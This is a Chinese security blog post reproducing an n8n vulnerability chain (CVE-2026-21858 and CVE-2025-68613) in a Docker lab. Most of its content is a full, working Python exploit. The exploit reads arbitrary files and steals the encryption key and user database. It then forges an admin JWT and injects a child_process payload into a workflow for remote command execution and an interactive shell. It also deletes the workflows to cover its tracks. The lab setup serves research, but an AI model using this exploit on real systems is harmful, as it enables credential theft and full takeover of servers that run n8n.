#  复现n8n Ni8mare：从任意文件读取到远程代码执行的全链漏洞利用 (CVSS 10.0)  
原创 qife
                    qife  网络安全技术点滴分享   2026-02-02 00:31  
  
## 一、漏洞详情  
  
本文复现了CVE-2026-21858和CVE-2025-68613漏洞链，展示了如何从  
未授权任意文件读取开始，进而  
伪造管理员令牌，最终通过  
表达式注入绕过沙箱实现  
远程命令执行的完整攻击过程。  
# CVE-2026-21858 + CVE-2025-68613 - n8n 完整攻击链  
  
未经身份验证的任意文件读取 → 管理员令牌伪造 → 沙箱绕过 → 远程代码执行  
- **CVE-2026-21858**  
: 任意文件读取漏洞（通过表单上传功能）  
  
- **CVE-2025-68613**  
: 沙箱绕过导致的远程代码执行（RCE）  
  
二、漏洞信息  
- **CVE-2026-21858 (任意文件读取) + CVE-2025-68613 (远程代码执行)**  
- **CVSS 评分：10.0 + 9.9 (严重)**  
- **受影响版本：**  
- AFR (任意文件读取): <= 1.65.0  
  
- RCE (远程代码执行): >= 0.211.0  
  
- **修复版本：**  
- AFR: 1.121.0  
  
- RCE: 1.120.4+  
  
-   
## 三、漏洞复现步骤  
  
这里以**CVE-2026-21858中的docker环境作为漏洞复现测试环境，在ubuntu系统中安装**  
  
**链接地址：https://github.com/Chocapikk/CVE-2026-21858**  
  
**1.git clone或者下载项目到ubuntu服务器目录中，如下所示**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE208M7DJjMiaYXjdAnpem9nXz9fF50o3jjQ0Ul4MbPcgbicbWLA9twSCTiasp6gPQk11OuHNJ7bmpiblRvQ/640?wx_fmt=png&from=appmsg "")  
  
**2.使用docker安装n8n Ni8mare漏洞测试环境，如下所示**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE208M7DJjMiaYXjdAnpem9nXz9asUUDqLic52pjibk8SFRau3u7zJClHBOM5RZZjAk8giakN3U3ZkDdcNIQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE208M7DJjMiaYXjdAnpem9nXz9rBvDe9AucPsHHwlDicSpiaJb9mrLTPGT7UxAVbt014NNIUho4Ctickbgg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE208M7DJjMiaYXjdAnpem9nXz9iaMOz12KvrXz5IBpdzlMYLsEn9cTsULQWZ6ia1saZHuNJWgpfMEb1bjA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE208M7DJjMiaYXjdAnpem9nXz93l1zBPYZKgySo1LgA7sBEGs3y177icAKQpV550RtodPYSmzlK6ZjZXw/640?wx_fmt=png&from=appmsg "")  
  
**3.浏览器打开n8n服务查看是否正常，如下所示**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE208M7DJjMiaYXjdAnpem9nXz9B2NplcRKVjoSy79YjVzHT2s3yCbTSLhU9ibnZiblINF0ypMbqL8tKS1Q/640?wx_fmt=png&from=appmsg "")  
  
**4.pip安装完exploit.py所需的python模块后，执行exploit.py测试获取/etc/passwd文件内容，如下所示**  
```
python3 exploit.py http://localhost:5678 /form/vulnerable-form --read /etc/passwd
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE208M7DJjMiaYXjdAnpem9nXz9JNLvPRcn0XqmWJub2nRJPHJpmnUmJpUCnoicct9UccV69ickzeqKfreg/640?wx_fmt=png&from=appmsg "")  
  
**5.执行cmd命令"id"获取当前用户id信息，如下所示**  
```
python3 exploit.py http://localhost:5678 /form/vulnerable-form --cmd "id"
```  
  
**6.执行如下命令获取rce交互式shell，如下所示**  
```
python3 exploit.py http://localhost:5678 /form/vulnerable-form
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE208M7DJjMiaYXjdAnpem9nXz9HMibIKmtQsLaRq9dgjqjPjeaEkxveriaFovu2iag4XXJvrOg5PLw3hXDg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE208M7DJjMiaYXjdAnpem9nXz973ZULcbPw33Ssun5rHg1BIBzheXtzxib8uKtqAMstP5aZjZL9ic4lfUg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/meR9vVNE208M7DJjMiaYXjdAnpem9nXz9JbLebzdhMfRhAZSozUEhrH86UPc5Zn3cFyj3vZxtia87bibr8IJUxJHg/640?wx_fmt=png&from=appmsg "")  
  
**四、漏洞exploit解析**  
```
#!/usr/bin/env python3
"""
CVE-2026-21858 + CVE-2025-68613 - n8n Full Chain Exploit
Arbitrary File Read → Admin Token Forge → Sandbox Bypass → RCE

Author: Chocapikk
GitHub: https://github.com/Chocapikk/CVE-2026-21858
"""

# 导入必要的库
import argparse      # 命令行参数解析
import hashlib       # 哈希计算
import json          # JSON处理
import secrets       # 安全随机数生成
import sqlite3       # SQLite数据库操作
import string        # 字符串操作
import tempfile      # 临时文件处理
from base64 import b64encode  # Base64编码

import jwt          # JWT令牌操作
import requests     # HTTP请求
from pwn import log # 美化输出日志

# ASCII艺术横幅
BANNER = """
╔═══════════════════════════════════════════════════════════════╗
║     CVE-2026-21858 + CVE-2025-68613 - n8n Full Chain          ║
║     Arbitrary File Read → Token Forge → Sandbox Bypass → RCE  ║
║                                                               ║
║     by Chocapikk                                              ║
╚═══════════════════════════════════════════════════════════════╝
"""

# RCE载荷模板，通过n8n表达式注入执行命令
RCE_PAYLOAD = '={{ (function() { var require = this.process.mainModule.require; var execSync = require("child_process").execSync; return execSync("CMD").toString(); })() }}'


def randstr(n: int = 12) -> str:
    """生成指定长度的随机字符串，包含小写字母和数字"""
    return "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def randpos() -> list[int]:
    """生成随机坐标位置（用于节点定位）"""
    return [secrets.randbelow(500) + 100, secrets.randbelow(500) + 100]


class Ni8mare:
    """主漏洞利用类"""

    def __init__(self, base_url: str, form_path: str):
        """初始化目标URL和会话"""
        self.base_url = base_url.rstrip("/")  # 清理URL末尾斜杠
        self.form_url = f"{self.base_url}/{form_path.lstrip('/')}"  # 构造表单URL
        self.session = requests.Session()  # 创建持久会话
        self.admin_token = None  # 管理员令牌初始为空

    def _api(self, method: str, path: str, **kwargs) -> requests.Response | None:
        """发送API请求的辅助函数"""
        kwargs.setdefault("timeout", 30)  # 默认超时30秒
        # 如果已有管理员令牌，添加到cookies中
        kwargs.setdefault("cookies", {"n8n-auth": self.admin_token} if self.admin_token else {})
        resp = self.session.request(method, f"{self.base_url}{path}", **kwargs)
        return resp if resp.ok else None  # 只返回成功响应

    def _lfi_payload(self, filepath: str) -> dict:
        """构造LFI（本地文件包含）载荷"""
        return {
            "data": {},
            "files": {
                # 生成随机文件名避免冲突
                f"f-{randstr(6)}": {
                    "filepath": filepath,  # 目标读取的文件路径
                    "originalFilename": f"{randstr(8)}.bin",  # 原始文件名
                    "mimetype": "application/octet-stream",  # MIME类型
                    "size": secrets.randbelow(90000) + 10000  # 随机文件大小
                }
            }
        }

    def _build_nodes(self, command: str) -> tuple[list, dict, str, str]:
        """构建恶意工作流节点"""
        # 生成随机节点名称
        trigger_name, rce_name = f"T-{randstr(8)}", f"R-{randstr(8)}"
        result_var = f"v{randstr(6)}"  # 结果变量名

        # 替换RCE载荷中的命令，转义双引号
        payload_value = RCE_PAYLOAD.replace("CMD", command.replace('"', '\\"'))

        # 构建触发节点
        nodes = [
            {
                "parameters": {},
                "name": trigger_name,
                "type": "n8n-nodes-base.manualTrigger",  # 手动触发器节点
                "typeVersion": 1,
                "position": randpos(),  # 随机位置
                "id": f"t-{randstr(12)}"  # 随机ID
            },
            {
                "parameters": {
                    "values": {
                        "string": [{
                            "name": result_var,
                            "value": payload_value  # 包含恶意表达式的值
                        }]
                    }
                },
                "name": rce_name,
                "type": "n8n-nodes-base.set",  # 设置节点
                "typeVersion": 2,
                "position": randpos(),
                "id": f"r-{randstr(12)}"
            }
        ]

        # 构建节点连接关系
        connections = {
            trigger_name: {
                "main": [[{"node": rce_name, "type": "main", "index": 0}]]
            }
        }

        return nodes, connections, trigger_name, rce_name

    # ========== 任意文件读取 (CVE-2026-21858) ==========

    def read_file(self, filepath: str, timeout: int = 30) -> bytes | None:
        """利用文件上传功能读取任意文件"""
        resp = self.session.post(
            self.form_url,
            json=self._lfi_payload(filepath),  # 发送LFI载荷
            headers={"Content-Type": "application/json"},
            timeout=timeout
        )
        # 返回响应内容（如果成功）
        return resp.content if resp.ok and resp.content else None

    def get_version(self) -> tuple[str, bool]:
        """获取n8n版本并检查是否易受攻击"""
        resp = self._api("GET", "/rest/settings", timeout=10)
        # 从响应中提取版本号
        version = resp.json().get("data", {}).get("versionCli", "0.0.0") if resp else "0.0.0"
        # 检查主要版本是否小于1.121（易受攻击）
        major, minor = map(int, version.split(".")[:2])
        return version, major < 1 or (major == 1 and minor < 121)

    def get_home(self) -> str | None:
        """读取/proc/self/environ获取HOME环境变量"""
        data = self.read_file("/proc/self/environ")
        if not data:
            return None
        # 解析环境变量，查找HOME
        for var in data.split(b"\x00"):
            if var.startswith(b"HOME="):
                return var.decode().split("=", 1)[1]
        return None

    def get_key(self, home: str) -> str | None:
        """读取n8n配置文件获取加密密钥"""
        data = self.read_file(f"{home}/.n8n/config")
        return json.loads(data).get("encryptionKey") if data else None

    def get_db(self, home: str) -> bytes | None:
        """读取SQLite数据库文件"""
        return self.read_file(f"{home}/.n8n/database.sqlite", timeout=120)

    def extract_admin(self, db: bytes) -> tuple[str, str, str] | None:
        """从数据库提取管理员用户信息"""
        with tempfile.NamedTemporaryFile(suffix=".db") as f:
            f.write(db)  # 写入临时文件
            f.flush()
            # 连接SQLite数据库
            conn = sqlite3.connect(f.name)
            # 查询管理员用户
            row = conn.execute(
                "SELECT id, email, password FROM user WHERE role='global:owner' LIMIT 1"
            ).fetchone()
            conn.close()
        return (row[0], row[1], row[2]) if row else None

    def forge_token(self, key: str, uid: str, email: str, pw_hash: str) -> str:
        """伪造JWT管理员令牌"""
        # 从加密密钥派生JWT密钥（取一半字符）
        secret = hashlib.sha256(key[::2].encode()).hexdigest()
        # 计算用户哈希
        h = b64encode(hashlib.sha256(f"{email}:{pw_hash}".encode()).digest()).decode()[:10]
        # 生成JWT令牌
        self.admin_token = jwt.encode({"id": uid, "hash": h}, secret, "HS256")
        return self.admin_token

    def verify_token(self) -> bool:
        """验证令牌是否有效（通过访问用户API）"""
        return self._api("GET", "/rest/users", timeout=10) is not None

    # ========== 远程代码执行 (CVE-2025-68613) ==========

    def rce(self, command: str) -> str | None:
        """执行远程代码"""
        # 构建恶意节点
        nodes, connections, _, _ = self._build_nodes(command)
        wf_name = f"wf-{randstr(16)}"  # 随机工作流名称

        # 创建工作流对象
        workflow = {
            "name": wf_name,
            "active": False,  # 不激活（避免持续运行）
            "nodes": nodes,
            "connections": connections,
            "settings": {}
        }

        # 创建新工作流
        resp = self._api("POST", "/rest/workflows", json=workflow, timeout=10)
        if not resp:
            return None
        wf_id = resp.json().get("data", {}).get("id")
        if not wf_id:
            return None

        # 准备执行数据
        run_data = {
            "workflowData": {
                "id": wf_id,
                "name": wf_name,
                "active": False,
                "nodes": nodes,
                "connections": connections,
                "settings": {}
            }
        }

        # 执行工作流
        resp = self._api("POST", f"/rest/workflows/{wf_id}/run", json=run_data, timeout=30)
        if not resp:
            self._api("DELETE", f"/rest/workflows/{wf_id}", timeout=5)  # 清理
            return None

        # 获取执行ID
        exec_id = resp.json().get("data", {}).get("executionId")
        result = self._get_result(exec_id) if exec_id else None

        # 删除工作流（清理痕迹）
        self._api("DELETE", f"/rest/workflows/{wf_id}", timeout=5)
        return result

    def _get_result(self, exec_id: str) -> str | None:
        """获取命令执行结果"""
        resp = self._api("GET", f"/rest/executions/{exec_id}", timeout=10)
        if not resp:
            return None

        # 从执行数据中提取结果
        data = resp.json().get("data", {}).get("data")
        if not data:
            return None

        parsed = json.loads(data)
        # 查找最后一个非空字符串作为结果
        for item in reversed(parsed):
            if isinstance(item, str) and len(item) > 3 and item not in ("success", "error"):
                return item.strip()
        return None

    # ========== 完整利用链 ==========

    def pwn(self) -> bool:
        """执行完整攻击链"""
        # 1. 获取HOME目录
        p = log.progress("HOME directory")
        home = self.get_home()
        if not home:
            return p.failure("Not found") or False
        p.success(home)

        # 2. 获取加密密钥
        p = log.progress("Encryption key")
        key = self.get_key(home)
        if not key:
            return p.failure("Failed") or False
        p.success(f"{key[:8]}...")

        # 3. 获取数据库
        p = log.progress("Database")
        db = self.get_db(home)
        if not db:
            return p.failure("Failed") or False
        p.success(f"{len(db)} bytes")

        # 4. 提取管理员信息
        p = log.progress("Admin user")
        admin = self.extract_admin(db)
        if not admin:
            return p.failure("Not found") or False
        uid, email, pw = admin
        p.success(email)

        # 5. 伪造令牌
        p = log.progress("Token forge")
        self.forge_token(key, uid, email, pw)
        p.success("OK")

        # 6. 验证管理员权限
        p = log.progress("Admin access")
        if not self.verify_token():
            return p.failure("Rejected") or False
        p.success("GRANTED!")

        log.success(f"Cookie: n8n-auth={self.admin_token}")
        return True


def parse_args():
    """解析命令行参数"""
    p = argparse.ArgumentParser(description="n8n Ni8mare - Full Chain Exploit")
    p.add_argument("url", help="Target URL (http://target:5678)")
    p.add_argument("form", help="Form path (/form/upload)")
    p.add_argument("--read", metavar="PATH", help="Read arbitrary file")
    p.add_argument("--cmd", metavar="CMD", help="Execute single command")
    p.add_argument("-o", "--output", metavar="FILE", help="Save LFI output to file")
    return p.parse_args()


def run_read(exploit: Ni8mare, path: str, output: str | None) -> None:
    """执行文件读取操作"""
    data = exploit.read_file(path)
    if not data:
        log.error("File read failed")
        return
    log.success(f"{len(data)} bytes")
    if output:
        # 保存到文件
        with open(output, "wb") as f:
            f.write(data)
        log.success(f"Saved: {output}")
        return
    # 直接打印内容
    print(data.decode())


def run_cmd(exploit: Ni8mare, cmd: str) -> None:
    """执行单条命令"""
    p = log.progress("RCE")
    out = exploit.rce(cmd)
    if not out:
        p.failure("Failed")
        return
    p.success("OK")
    print(f"\n{out}")


def run_shell(exploit: Ni8mare) -> None:
    """进入交互式shell模式"""
    log.info("Interactive mode (type 'exit' to quit)")
    while True:
        try:
            # 红色提示符
            cmd = input("\033[91mn8n\033[0m> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if not cmd or cmd == "exit":
            return
        out = exploit.rce(cmd)
        if out:
            print(out)


def main():
    """主函数"""
    print(BANNER)
    args = parse_args()

    # 初始化漏洞利用对象
    exploit = Ni8mare(args.url, args.form)
    version, vuln = exploit.get_version()
    log.info(f"Target: {exploit.form_url}")
    log.info(f"Version: {version} ({'VULN' if vuln else 'SAFE'})")

    # 如果指定了--read参数，只读取文件
    if args.read:
        run_read(exploit, args.read, args.output)
        return

    # 执行完整攻击链
    if not exploit.pwn():
        return

    # 如果指定了--cmd参数，执行单条命令
    if args.cmd:
        run_cmd(exploit, args.cmd)
        return

    # 否则进入交互式shell
    run_shell(exploit)


if __name__ == "__main__":
    main()
```  
  
